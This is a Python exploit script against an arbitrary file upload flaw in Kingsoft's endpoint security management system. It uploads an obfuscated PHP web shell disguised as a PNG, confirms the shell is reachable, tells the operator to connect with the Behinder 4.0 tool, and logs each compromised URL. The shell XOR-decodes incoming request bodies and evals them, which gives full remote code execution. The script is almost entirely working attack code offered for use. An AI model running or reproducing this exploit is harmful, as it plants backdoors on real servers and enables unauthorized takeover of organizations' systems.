import requests
import time
import buter
import wirtefile

filename = "./reps/金山终端安全系统任意文件上传-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
"Content-Type":"multipart/form-data;boundary=----WebKitFormBoundaryhQcaKJIKAnejKGru"
}
poc = "/tools/manage/upload.php"

data = '''------WebKitFormBoundaryhQcaKJIKAnejKGru
Content-Disposition: form-data; name="file";filename="21232f297a57a5a743894a0e4a801f13.php"
Content-Type: image/png

<?php
@error_reporting(0);
	function Decrypt($data)
{
    $key="e45e329feb5d925b"; 
    $bs="base64_"."decode";
	$after=$bs($data."");
	for($i=0;$i<strlen($after);$i++) {
    	$after[$i] = $after[$i]^$key[$i+1&15]; 
    }
    return $after;
}
	$post=Decrypt(file_get_contents("php://input"));
    eval($post);
?>
------WebKitFormBoundaryhQcaKJIKAnejKGru--'''

def jstssafileup(url):
    shell_path = '/Uploaddir/21232f297a57a5a743894a0e4a801f13.php'
    try:
        res = requests.post(url=url+poc, data=data, headers=headers, timeout=10,verify=False)
        if "successfully uploaded" in res.text:
            print(buter.colors.GREEN+  f"存在金山终端安全系统任意文件上传 正在上传文件 url : {url}" + buter.colors.END)
            shell_paths = f"{url}{shell_path}"
            reps = requests.get(url=shell_paths,headers=headers,timeout=10,verify=False)
            if reps.status_code == 200:
                print(buter.colors.GREEN+f"文件上传成功 请使用冰蝎4.0 xor_base64进行连接 : {shell_paths}"+buter.colors.END)
                wirtefile.writefiles(filename,shell_paths)
            else:
                print(buter.colors.LAN+f"可能存在杀软 url : {url}"+buter.colors.LAN)
        else:
            print(buter.colors.RED+ f"未发现金山终端安全系统任意文件上传 url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
